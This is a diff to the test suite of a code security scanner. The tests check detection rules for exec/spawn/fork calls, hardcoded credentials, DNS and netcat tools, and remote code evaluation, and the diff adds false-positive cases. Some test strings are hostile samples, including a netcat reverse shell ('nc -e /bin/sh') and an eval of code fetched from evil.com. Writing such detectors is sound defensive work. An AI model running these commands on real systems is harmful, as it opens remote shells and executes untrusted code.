@@ -56,6 +56,8 @@ describe('SCAN_RULES', () => {
     it('DC006 matches exec()', () => {
       testPattern('DC006', 'exec(command)', true)
       testPattern('DC006', 'execute plan', false)
+      testPattern('DC006', 'regex.exec(str)', false)
+      testPattern('DC006', 'db.exec(query)', false)
     })
 
     it('DC007 matches system()', () => {
@@ -155,6 +157,8 @@ describe('SCAN_RULES', () => {
     it('DC010 matches spawn()', () => {
       testPattern('DC010', "spawn('ls', ['-la'])", true)
       testPattern('DC010', 'respawn', false)
+      testPattern('DC010', 'enemy.spawn()', false)
+      testPattern('DC010', 'pool.spawn(task)', false)
     })
 
     it('DC011 matches execSync()', () => {
@@ -169,6 +173,8 @@ describe('SCAN_RULES', () => {
     it('DC013 matches fork()', () => {
       testPattern('DC013', "fork('./worker.js')", true)
       testPattern('DC013', 'forked from upstream', false)
+      testPattern('DC013', 'repo.fork()', false)
+      testPattern('DC013', 'cluster.fork()', false)
     })
   })
 
@@ -188,10 +194,13 @@ describe('SCAN_RULES', () => {
       testPattern('CE003', 'ghp_short', false)
     })
 
-    it('CE004 matches hardcoded passwords', () => {
+    it('CE004 matches hardcoded passwords (8+ chars)', () => {
       testPattern('CE004', 'password = "mysecret"', true)
       testPattern('CE004', "password = 'mysecret'", true)
       testPattern('CE004', 'password policy', false)
+      testPattern('CE004', "password = 'test'", false)
+      testPattern('CE004', 'password = ""', false)
+      testPattern('CE004', "password = 'abc'", false)
     })
 
     it('CE005 matches GitHub fine-grained PATs', () => {
@@ -212,8 +221,11 @@ describe('SCAN_RULES', () => {
       testPattern('DC014', 'newFunction()', false)
     })
 
-    it('DC015 matches Function() invocation', () => {
+    it('DC015 matches Function() invocation with string argument', () => {
       testPattern('DC015', 'Function("return evil")()', true)
+      testPattern('DC015', "Function('return x')()", true)
+      testPattern('DC015', 'myFunction(arg)', false)
+      testPattern('DC015', 'someFunction("test")', false)
     })
   })
 
@@ -232,8 +244,13 @@ describe('SCAN_RULES', () => {
       testPattern('DE010', 'wget("https://example.com")', true)
     })
 
-    it('DE011 matches nc (netcat)', () => {
+    it('DE011 matches nc (netcat) with suspicious flags', () => {
       testPattern('DE011', 'nc -e /bin/sh 10.0.0.1 4444', true)
+      testPattern('DE011', 'nc -lvp 4444', true)
+      testPattern('DE011', 'nc -nlp 8080', true)
+      testPattern('DE011', 'the nc command', false)
+      testPattern('DE011', 'nc state', false)
+      testPattern('DE011', 'sync data', false)
     })
 
     it('DE012 matches netcat', () => {
@@ -248,12 +265,20 @@ describe('SCAN_RULES', () => {
       testPattern('DE014', 'nslookup example.com', true)
     })
 
-    it('DE015 matches dig (DNS query)', () => {
+    it('DE015 matches dig with domain argument', () => {
       testPattern('DE015', 'dig example.com', true)
+      testPattern('DE015', 'dig @8.8.8.8 example.com', true)
+      testPattern('DE015', 'dig into the problem', false)
+      testPattern('DE015', 'dig deeper', false)
+      testPattern('DE015', 'we should dig around', false)
     })
 
-    it('DE016 matches host (DNS resolution)', () => {
+    it('DE016 matches host with domain argument', () => {
       testPattern('DE016', 'host example.com', true)
+      testPattern('DE016', 'host evil.example.org', true)
+      testPattern('DE016', 'host a server', false)
+      testPattern('DE016', 'the host system', false)
+      testPattern('DE016', 'host machine', false)
     })
   })
 
@@ -275,21 +300,28 @@ describe('SCAN_RULES', () => {
   })
 
   describe('CREDENTIAL_EXPOSURE — additional', () => {
-    it('CE007 matches hardcoded token', () => {
-      testPattern('CE007', "token = 'abc123'", true)
+    it('CE007 matches hardcoded token (8+ char value)', () => {
+      testPattern('CE007', "token = 'abc12345xyz'", true)
+      testPattern('CE007', "token = 'eyJhbGciOiJIUzI1NiJ9'", true)
       testPattern('CE007', 'token length', false)
+      testPattern('CE007', "token = 'short'", false)
+      testPattern('CE007', "token = ''", false)
     })
 
-    it('CE008 matches hardcoded api_key', () => {
+    it('CE008 matches hardcoded api_key (8+ char value)', () => {
       testPattern('CE008', "api_key = 'mysecret'", true)
+      testPattern('CE008', "api_key = 'short'", false)
     })
 
     it('CE009 matches hardcoded apiKey', () => {
       testPattern('CE009', 'apiKey = "supersecret"', true)
     })
 
-    it('CE010 matches hardcoded secret', () => {
-      testPattern('CE010', "secret = 'shh'", true)
+    it('CE010 matches hardcoded secret (8+ char value)', () => {
+      testPattern('CE010', "secret = 'my-secret-value'", true)
+      testPattern('CE010', "secret = 'abc12345'", true)
+      testPattern('CE010', "secret = 'shh'", false)
+      testPattern('CE010', "secret = ''", false)
     })
 
     it('CE011 matches GCP service account JSON', () => {
@@ -433,6 +465,56 @@ describe('SCAN_RULES', () => {
 
     it('RCE003 matches eval(fetch())', () => {
       testPattern('RCE003', 'eval(await fetch("https://evil.com"))', true)
+    })
+  })
+
+  describe('false positive prevention', () => {
+    it('does not flag common English uses of "dig"', () => {
+      testPattern('DE015', 'dig into the problem', false)
+      testPattern('DE015', 'dig deeper to understand', false)
+      testPattern('DE015', 'let us dig around the codebase', false)
+    })
+
+    it('does not flag common English uses of "host"', () => {
+      testPattern('DE016', 'host a server', false)
+      testPattern('DE016', 'the host system runs Linux', false)
+      testPattern('DE016', 'host machine is ready', false)
+      testPattern('DE016', 'the remote host responded', false)
+    })
+
+    it('does not flag "nc" in normal text', () => {
+      testPattern('DE011', 'the nc command', false)
+      testPattern('DE011', 'nc state', false)
+      testPattern('DE011', 'sync data', false)
+      testPattern('DE011', 'this is nc', false)
+    })
+
+    it('does not flag regex.exec() or db.exec()', () => {
+      testPattern('DC006', 'const result = regex.exec(input)', false)
+      testPattern('DC006', 'await db.exec(sql)', false)
+      testPattern('DC006', 'pattern.exec(text)', false)
+    })
+
+    it('does not flag method calls on objects for spawn/fork', () => {
+      testPattern('DC010', 'enemy.spawn()', false)
+      testPattern('DC010', 'threadPool.spawn(task)', false)
+      testPattern('DC013', 'repo.fork()', false)
+      testPattern('DC013', 'octokit.repos.fork()', false)
+    })
+
+    it('does not flag short/placeholder credential values', () => {
+      testPattern('CE007', "token = 'test'", false)
+      testPattern('CE007', "token = ''", false)
+      testPattern('CE008', "api_key = 'todo'", false)
+      testPattern('CE009', "apiKey = 'change'", false)
+      testPattern('CE010', "secret = 'xxx'", false)
+      testPattern('CE004', "password = 'test'", false)
+    })
+
+    it('does not flag named functions matching Function pattern', () => {
+      testPattern('DC015', 'myFunction(arg)', false)
+      testPattern('DC015', 'createFunction(params)', false)
+      testPattern('DC015', 'asyncFunction(callback)', false)
     })
   })
 })
